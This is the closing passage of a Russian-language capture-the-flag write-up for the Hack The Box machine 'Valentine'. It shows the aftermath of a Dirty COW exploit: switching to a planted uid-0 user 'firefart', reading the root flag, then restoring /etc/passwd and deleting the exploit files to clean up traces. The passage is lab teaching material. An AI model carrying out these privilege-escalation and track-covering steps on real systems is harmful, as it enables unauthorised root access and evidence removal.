You can log in with the username 'firefart' and the password 'qwerty'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

Сменим пользователя на `firefart`, даровав себе тем самым права суперпользователя:
```text
hype@Valentine:~$ su firefart
Password: qwe123!@#

firefart@Valentine:/home/hype# whoami
firefart

firefart@Valentine:/home/hype# id
uid=0(firefart) gid=0(root) groups=0(root)
```

Теперь заберем флаг:
```text
firefart@Valentine:/home/hype# cat /root/root.txt
f1bb6d75????????????????????????
```

почистим за собой следы:
```text
firefart@Valentine:/home/hype# mv /tmp/passwd.bak /etc/passwd
firefart@Valentine:/home/hype# exit
su: User not known to the underlying authentication module

hype@Valentine:~$ su firefart
Unknown id: firefart

hype@Valentine:~$ rm dirty.c dirty
```

и так же идем радоваться жизни.

Берегите свое(и) сердце(а), спасибо за внимание :innocent:

{: .center-image}
![valentine-owned-user.png]({{ "/img/htb/boxes/valentine/valentine-owned-user.png" | relative_url }})

{: .center-image}
![valentine-owned-root.png]({{ "/img/htb/boxes/valentine/valentine-owned-root.png" | relative_url }})

{: .center-image}
![valentine-trophy.png]({{ "/img/htb/boxes/valentine/valentine-trophy.png" | relative_url }})
